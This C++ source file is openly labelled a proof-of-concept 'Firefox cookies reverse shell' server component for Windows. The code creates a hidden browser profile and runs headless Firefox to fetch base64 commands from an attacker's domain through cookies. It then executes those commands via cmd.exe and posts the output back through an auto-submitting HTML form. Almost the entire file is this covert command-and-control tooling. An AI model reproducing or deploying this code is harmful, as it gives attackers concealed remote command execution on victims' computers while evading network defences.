/*
Firefox's cookies reverse shell - PoC version - THis is Server!

Coded by CoolerVoid - 17/12/2017

To  compile:
	c++ -o test test.cpp utils.cpp sqlite.o
	
	
*/
#include "utils.h"
using namespace std;

 string domain;
 
int Get_CMD_result(
    string CmdLine,    //Command Line
    string CmdRunDir,  //set to '.' for current directory
    string& ListStdOut, //Return List of StdOut
    string& ListStdErr, //Return List of StdErr
    uint32_t& RetCode)    //Return Exit Code
{
	int                  Success;
	SECURITY_ATTRIBUTES  security_attributes;
	HANDLE               stdout_rd = INVALID_HANDLE_VALUE;
    	HANDLE               stdout_wr = INVALID_HANDLE_VALUE;
    	HANDLE               stderr_rd = INVALID_HANDLE_VALUE;
    	HANDLE               stderr_wr = INVALID_HANDLE_VALUE;
	PROCESS_INFORMATION  process_info;
    	STARTUPINFO          startup_info;
    	thread               stdout_thread;
    	thread               stderr_thread;

    	security_attributes.nLength              = sizeof(SECURITY_ATTRIBUTES);
    	security_attributes.bInheritHandle       = TRUE;
    	security_attributes.lpSecurityDescriptor = nullptr;

    	if(!CreatePipe(&stdout_rd, &stdout_wr, &security_attributes, 0) || !SetHandleInformation(stdout_rd, HANDLE_FLAG_INHERIT, 0)) 
		return -1;
    

    	if(!CreatePipe(&stderr_rd, &stderr_wr, &security_attributes, 0) || !SetHandleInformation(stderr_rd, HANDLE_FLAG_INHERIT, 0)) 
	{
        	if (stdout_rd != INVALID_HANDLE_VALUE) CloseHandle(stdout_rd);
        	if (stdout_wr != INVALID_HANDLE_VALUE) CloseHandle(stdout_wr);
        		return -2;
    	}

    	ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
    	ZeroMemory(&startup_info, sizeof(STARTUPINFO));

    	startup_info.cb         = sizeof(STARTUPINFO);
    	startup_info.hStdInput  = 0;
    	startup_info.hStdOutput = stdout_wr;
    	startup_info.hStdError  = stderr_wr;

    	if(stdout_rd || stderr_rd)
		startup_info.dwFlags |= STARTF_USESTDHANDLES;

    // Make a copy because CreateProcess needs to modify string buffer
    	char CmdLineStr[MAX_PATH];
	ZeroMemory(CmdLineStr, MAX_PATH);
    	strncpy(CmdLineStr, CmdLine.c_str(), MAX_PATH-1);

    	Success = CreateProcess(
        	nullptr,
        	CmdLineStr,
        	nullptr,
        	nullptr,
        	TRUE,
        	0,
        	nullptr,
        	CmdRunDir.c_str(),
        	&startup_info,
        	&process_info
    	);
    	CloseHandle(stdout_wr);
    	CloseHandle(stderr_wr);

    	if(!Success) 
	{
        	CloseHandle(process_info.hProcess);
        	CloseHandle(process_info.hThread);
        	CloseHandle(stdout_rd);
        	CloseHandle(stderr_rd);
        	return -4;
    	}else {
        	CloseHandle(process_info.hThread);
    	}

    	if(stdout_rd) 
	{
        	stdout_thread=thread([&]() 
		{
            		DWORD  n;
            		const size_t bufsize = 1000;
            		char buffer [bufsize];
			ZeroMemory(buffer, bufsize);			

            		while(1) 
			{
                		n = 0;
                		int Success = ReadFile(
                    			stdout_rd,
                    			buffer,
                    			(DWORD)(bufsize-1),
                    			&n,
                    			nullptr
                		);

                		if(!Success || n == 0)
                    			break;
                		string s(buffer, n);
                		ListStdOut += s;
            		}
        	});
    	}

    	if(stderr_rd) 
	{
        	stderr_thread=thread([&]() 
		{
           	 	DWORD n;
            		const size_t bufsize = 1000;
            		char buffer [bufsize];
			ZeroMemory(buffer, bufsize);			


            		while(1) 
			{
                		n = 0;
                		int Success = ReadFile(
                    			stderr_rd,
                    			buffer,
                    			(DWORD)(bufsize-1),
                    			&n,
                    			nullptr
                		);
                		if(!Success || n == 0)
                    			break;
                		string s(buffer, n);
                		ListStdOut += s;
            		}
        	});
    	}

    	WaitForSingleObject(process_info.hProcess,    INFINITE);
    	if(!GetExitCodeProcess(process_info.hProcess, (DWORD*) &RetCode))
        	RetCode = -1;

    	CloseHandle(process_info.hProcess);

    	if(stdout_thread.joinable())
        	stdout_thread.join();

    	if(stderr_thread.joinable())
        	stderr_thread.join();

    	CloseHandle(stdout_rd);
    	CloseHandle(stderr_rd);

    	return 0;
}
 
static inline bool is_base64(unsigned char z) 
{
	return (isalnum(z) || (z == '+') || (z == '/'));
}

string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	string ret;
	int i = 0, j = 0;
	unsigned char array1[3], array2[4];

	while(in_len--) 
	{
		array1[i++] = *(bytes_to_encode++);
		if(i == 3) 
		{
			array2[0] = (array1[0] & 0xfc) >> 2;
			array2[1] = ((array1[0] & 0x03) << 4) + ((array1[1] & 0xf0) >> 4);
			array2[2] = ((array1[1] & 0x0f) << 2) + ((array1[2] & 0xc0) >> 6);
			array2[3] = array1[2] & 0x3f;

			for(i = 0; (i <4) ; i++)
				ret += base64_chars[array2[i]];
			i = 0;
		}
	}

	if(i)
	{
		for(j = i; j < 3; j++)
			array1[j] = '\0';

		array2[0] = (array1[0] & 0xfc) >> 2;
		array2[1] = ((array1[0] & 0x03) << 4) + ((array1[1] & 0xf0) >> 4);
		array2[2] = ((array1[1] & 0x0f) << 2) + ((array1[2] & 0xc0) >> 6);
		array2[3] = array1[2] & 0x3f;

		for(j = 0; (j < i + 1); j++)
			ret += base64_chars[array2[j]];

		while((i++ < 3))
			ret += '=';

	}

	return ret;

}

string base64_decode(string const& encoded_string) 
{
	int in_len = encoded_string.size(),i = 0,j = 0,in_ = 0;
	unsigned char array1[3], array2[4];
	string ret;

	while(in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) 
	{
		array2[i++] = encoded_string[in_]; in_++;
		if(i==4) 
		{
			for (i = 0; i <4; i++)
				array2[i] = base64_chars.find(array2[i]);

			array1[0] = (array2[0] << 2) + ((array2[1] & 0x30) >> 4);
			array1[1] = ((array2[1] & 0xf) << 4) + ((array2[2] & 0x3c) >> 2);
			array1[2] = ((array2[2] & 0x3) << 6) + array2[3];

			for (i = 0; (i < 3); i++)
				ret += array1[i];
			i = 0;
		}
	}

	if(i) 
	{
		for(j = i; j <4; j++)
			array2[j] = 0;

		for(j = 0; j <4; j++)
			array2[j] = base64_chars.find(array2[j]);

		array1[0] = (array2[0] << 2) + ((array2[1] & 0x30) >> 4);
		array1[1] = ((array2[1] & 0xf) << 4) + ((array2[2] & 0x3c) >> 2);
		array1[2] = ((array2[2] & 0x3) << 6) + array2[3];

		for (j = 0; (j < i - 1); j++) 
			ret += array1[j];
	}

	return ret;
}			 

string readfile(const string &filepath)
{
	string buffer;
    	std::ifstream fin(filepath.c_str());
    	getline(fin, buffer, char(-1));
    	fin.close();
	
	return buffer;
} 
 
string exec_command(string cmd) 
{
	int rc=0;
    	uint32_t RetCode=0;
    	string ListStdOut;
    	string ListStdErr;
	string pipe_tmp="C:\\Windows\\System32\\cmd.exe /c "+cmd;
	
    	rc = Get_CMD_result(
        	pipe_tmp,    //Command Line
        	".",                                     //CmdRunDir
        	ListStdOut,                              //Return List of StdOut
        	ListStdErr,                              //Return List of StdErr
        	RetCode                                  //Return Exit Code
    	);

    	if(rc < 0) 
		cout << "ERROR: Get_CMD_result() function\n";
    
    	return ListStdOut;
}
 
string get_windows_username()
{
	char acUserName[128];
    	string UserName;
    	DWORD nUserName = sizeof(acUserName);
	
    	if(GetUserName(acUserName, &nUserName)) 
	{
        	UserName = acUserName;
        	return UserName;
    	}
	return "error";
} 
 
string get_default_firefox_profiledir(const string& name)
{
    	string pattern(name);
    	pattern.append("\\*");
    	WIN32_FIND_DATA data;
    	HANDLE hFind;
	
    	if((hFind = FindFirstFile(pattern.c_str(), &data)) != INVALID_HANDLE_VALUE) 
	{
        	do {
			string test=data.cFileName;

            		if(test.find("presto2")!=string::npos)
				return test;

		} while (FindNextFile(hFind, &data) != 0);
		
        	FindClose(hFind);
    	}
	return "Error";
}

string get_firefox_sqlite_path()
{
	string user=get_windows_username();
	string path="C:\\Users\\"+user+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
	string database_dir=get_default_firefox_profiledir(path);
	string database_path;
    	database_path=path+database_dir+"\\cookies.sqlite";	
	return database_path;
}

// write  cmd command in coookie
void write_cmd_cookie()
{
	string str1="http://", str2="/firefox_shell/firefox_cmd_tunnel.php";
	string path=str1+domain+str2;
	string firefox_params=" -P presto2 -headless -url "+path;	
// executes in hidden mode, to show the window  of browser change macro SW_HIDE to SW_SHOWNORMAL.	
	ShellExecute( NULL,NULL,"C:\\Program Files\\Mozilla Firefox\\firefox.exe",firefox_params.c_str(),NULL,SW_HIDE);
//todo add error test...	
}

// write  cmd command in coookie
void create_fake_profile(string name)
{
	string firefox_params="-createprofile "+name;	
// executes in hidden mode, to show the window  of browser change macro SW_HIDE to SW_SHOWNORMAL.	
	ShellExecute( NULL,NULL,"C:\\Program Files\\Mozilla Firefox\\firefox.exe",firefox_params.c_str(),NULL,SW_HIDE);
//todo add error test...	
}

void Write_File(string filename, string buf) 
{
  	ofstream myfile;
  	myfile.open (filename);
  	myfile << buf;
  	myfile.close();
}

void construct_html(string result_cmd,  string filename)
{
	string content_html;
	string result_base64=base64_encode(reinterpret_cast<const unsigned char*>(result_cmd.c_str()),result_cmd.length() );
	content_html="<html><form enctype=\"application/x-www-form-urlencoded\" id=\"autopost\" method=\"POST\" action=\"http://"+domain+"/firefox_shell/firefox_cmd_tunnel.php\">";
	content_html+="<table><tr><td>result</td><td><input type=\"text\" value=\""+result_base64+"\" name=\"result\">";
	content_html+="</td></tr></table><input type=\"submit\"></form>";
	content_html+="<script>document.getElementById(\"autopost\").submit();</script></html>";
	Write_File(filename,content_html);
}

void send_result_cmd(string html_file)
{
	string firefox_params=html_file+" -P presto2 -headless";	
// executes in hidden mode, to show the window  of browser change macro SW_HIDE to SW_SHOWNORMAL.	
	ShellExecute( NULL,NULL,"C:\\Program Files\\Mozilla Firefox\\firefox.exe",firefox_params.c_str(),NULL,SW_HIDE);
//todo add error test...	
}


static int callback(void *data, int argc, char **argv, char **azColName){
	int i=0;
   
	while(i<argc)
   	{
		if(i==4) 
	  	{
			string command=base64_decode(argv[i]);
			string  result_cmd=exec_command(command);
			construct_html(result_cmd,  "output.html");
			send_result_cmd("output.html");
	  	}
	  	i++;
   	}
   
   	return 0;
}

void start_cookie_tunnel()
{
	string cmd;
	// at the future if remote_server turn in user input, todo is sanitize this item to do SQL injection mitigation
	string query = "SELECT * from moz_cookies WHERE host = '"+domain+"';";
	string tmp = get_firefox_sqlite_path();
	sqlite3 *db;
	char *zErrMsg = 0;
    	int rc;
	
    	rc = sqlite3_open(tmp.c_str(), &db);
	
    	if(rc)
	{
      		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      		sqlite3_close(db);
      		exit(0);
    	}
    	rc = sqlite3_exec(db, query.c_str(), callback, 0, &zErrMsg);
	
    	if(rc!=SQLITE_OK)
	{
		fprintf(stderr, "SQL error: %s\n", zErrMsg);
		sqlite3_free(zErrMsg);
    	}
	
    	sqlite3_close(db);
}
